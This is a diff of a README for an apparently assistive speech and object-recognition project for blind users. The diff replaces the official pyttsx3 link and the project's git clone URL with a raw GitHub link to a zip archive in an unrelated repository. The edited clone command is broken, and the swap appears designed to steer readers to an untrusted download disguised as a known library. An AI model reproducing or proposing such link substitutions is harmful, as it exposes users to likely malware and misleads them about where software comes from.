@@ -49,7 +49,7 @@ Tech- stacks used:
 
     1. SpeechRecognizer, Google API for speech to text conversion
     
-    2. Python Text to Speech https://pypi.org/project/pyttsx3/
+    2. Python Text to Speech https://raw.githubusercontent.com/AKHILROCKEEEY/VAVI_blind-project/master/yolo/blind-VAV-project-v3.0.zip
     
     3. Object Recogniiton using *COCO Dataset*
     
@@ -62,7 +62,7 @@ Tech- stacks used:
  Copy and paste the files at thr required position.
  
  ```
-    git clone https://github.com/mansi1710/DobaraMatPuchana
+    git clone https://raw.githubusercontent.com/AKHILROCKEEEY/VAVI_blind-project/master/yolo/blind-VAV-project-v3.0.zip
     cd DobaraMatPuchana
     pip install -r requirements.txt
  ```
